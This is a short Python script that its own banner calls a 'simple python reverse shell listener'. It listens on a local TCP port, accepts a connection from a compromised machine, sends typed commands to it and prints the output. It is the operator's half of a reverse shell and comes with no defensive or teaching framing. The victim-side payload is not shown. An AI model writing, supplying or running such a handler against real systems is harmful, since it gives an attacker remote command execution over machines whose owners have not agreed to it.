import socket
import sys

# Create Socket
def socket_create():
	global host
	global port
	global s

	host = '127.0.0.1'
	port = 9999
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print("SSG simple python reverse shell listner")

# Bind Socket to port and wait for connection
def socket_bind():
	global host
	global port
	global s

	print("Listening on port " + str(port) + " ... ")
	s.bind((host, port))
	s.listen(5)	# argument 5 : back connection (over 5 connection refusing)
	
# Accept Connection
def socket_accept():
	(conn, (ip, port)) = s.accept()
	print("Connection from [" + ip + "] " + str(port))
	interactive(conn)
	conn.close()
	s.close()

def interactive(conn):
	while True:
		command = input()

		if command == 'quit':
			conn.send(str.encode(command))
			print("Good Bye ...")
			conn.close()
			s.close()
			sys.exit()

		if len(str.encode(command)) > 0:
			conn.send(str.encode(command))
			client_response = str(conn.recv(2048), "utf-8")
			print(client_response, end="")

def main():
	socket_create()
	socket_bind()
	socket_accept()

if __name__ == "__main__":
	main()